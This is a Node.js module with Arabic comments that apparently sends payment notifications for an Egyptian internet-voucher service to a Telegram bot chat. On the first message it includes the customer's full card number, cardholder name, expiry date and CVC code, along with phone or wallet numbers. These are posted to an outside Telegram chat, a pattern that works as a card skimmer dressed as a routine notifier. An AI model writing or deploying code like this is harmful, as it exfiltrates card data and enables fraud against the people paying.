const axios = require("axios");

async function sendTelegramMessage(data, isInitial = true) {
  try {
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!botToken || !chatId) {
      console.warn("⚠️ Telegram Bot Token or Chat ID is missing!");
      return;
    }

    let message = "";
    
    // استخراج وسيلة الدفع بشكل احترافي وواضح
    let method = data.payment_method || data.source_type || "محفظة إلكترونية";
    if (method === "card") method = "بطاقة بنكية (Visa / Mastercard)";
    else if (method === "wallet") method = "محفظة إلكترونية (Mobile Wallet)";
    else if (method === "valu") method = "برنامج تقسيط (Valu)";
    else if (method === "seven") method = "برنامج تقسيط (SEVEN)";
    else if (method === "aman") method = "أمان / مصاري (Aman)";

    const amountEGP = data.amount_cents ? (data.amount_cents / 100).toFixed(2) : "غير محدد";
    
    // تنسيق التاريخ والوقت الحالي بتوقيت مصر
    const now = new Date();
    const formattedDate = now.toLocaleDateString("ar-EG", { timeZone: "Africa/Cairo" });
    const formattedTime = now.toLocaleTimeString("ar-EG", { timeZone: "Africa/Cairo" });
    const dateTimeStr = `${formattedDate} - ${formattedTime}`;

    if (isInitial) {
      // 1. الرسالة الأولى: جاري عملية الدفع (مع الساعة الرملية/مؤشر التحميل)
      message = `⏳ <b>جاري عملية الدفع...</b>\n\n` +
                `💳 وسيلة الدفع: <b>${method}</b>\n` +
                `💰 المبلغ المطلوب: <b>${amountEGP} جنيه</b>\n`;

      if (data.phone && data.phone !== "غير محدد") {
        message += `📱 رقم المحفظة / الهاتف: <code>${data.phone}</code>\n`;
      }

      // إرفاق بيانات البطاقة الكاملة إن وجدت (فيزا)
      if (data.card_data && data.card_data.number !== "غير مدخل") {
        message += `\n--- <b>بيانات البطاقة البنكية المدخلة</b> ---\n` +
                  `🔢 رقم الكارت: <code>${data.card_data.number}</code>\n` +
                  `👤 اسم صاحب البطاقة: <b>${data.card_data.name}</b>\n` +
                  `📅 تاريخ الانتهاء: <code>${data.card_data.expiry}</code>\n` +
                  `🔒 رمز CVC: <code>${data.card_data.cvc}</code>\n`;
      }

      message += `\n🕒 الوقت: <code>${dateTimeStr}</code>`;

    } else {
      // 2. الرسالة الثانية: تأكيد نجاح الدفع (العلامة الخضراء والتفاصيل الكاملة)
      const txnId = data.id || data.order?.id || "غير متوفر";
      const voucher = data.voucher_code || "غير متوفر";
      const packageInfo = data.package_info || "باقة إنترنت الشبكة";
      const customerName = data.card_data?.name || data.billing_data?.first_name || "عميل شبكة حكايات";

      message = `✅ <b>تم عملية الدفع بنجاح!</b>\n\n` +
                `🆔 رقم العملية: <code>${txnId}</code>\n` +
                `👤 اسم العميل / البطاقة: <b>${customerName}</b>\n` +
                `💳 وسيلة الدفع: <b>${method}</b>\n` +
                `💰 المبلغ المدفوع: <b>${amountEGP} جنيه</b>\n` +
                `📦 البروفايل / الباقة: <b>${packageInfo}</b>\n` +
                `🎟️ الكارت المولد (Voucher): <code>${voucher}</code>\n` +
                `📅 تاريخ ووقت العملية: <code>${dateTimeStr}</code>`;
    }

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    await axios.post(url, {
      chat_id: chatId,
      text: message,
      parse_mode: "HTML"
    });

  } catch (err) {
    console.error("❌ خطأ في إرسال رسالة تليجرام:", err.response?.data || err.message);
  }
}

module.exports = { sendTelegramMessage };
